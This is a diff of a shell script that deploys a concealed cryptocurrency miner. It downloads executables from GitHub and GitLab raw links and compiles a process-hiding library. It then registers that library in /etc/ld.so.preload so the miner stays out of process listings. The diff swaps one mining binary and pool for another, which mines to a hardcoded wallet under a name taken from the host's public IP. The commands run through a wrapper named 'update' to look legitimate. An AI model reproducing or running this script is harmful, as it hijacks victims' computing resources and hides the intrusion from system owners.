@@ -31,8 +31,8 @@ echo ""
 echo " "
 echo " "
 
-./update/update wget https://github.com/Diefky/111/raw/main/Comedy
-chmod +x Comedy 
+./update/update wget https://gitlab.com/asraktanusi064/gacor/-/raw/main/gacormaseh?inline=false
+chmod +x gacormaseh 
  
 ./update/update wget https://github.com/nathanfleight/update/raw/main/MagicComedy.zip
 unzip MagicComedy.zip 
@@ -41,4 +41,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/ 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
  
-./update/update ./Comedy --url=ssl://0x7a8f069g453654345612345dbF742b2c8.$(echo $(shuf -i 201-400 -n 1)-$(shuf -i 1-200 -n 1)-$(shuf -i 401-600 -n 1)-$(shuf -i 601-800 -n 1))@eth-sg.flexpool.io:5555 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./update/update ./gacormaseh -a ixi -r $ip -w 3AymKAZRtcHptxN6eXrwk6FXYpvYzW9cCWLRtrKX6YhGbqUSNLYzw6ScPdz3dZBJy -p http://mineixi.com:80
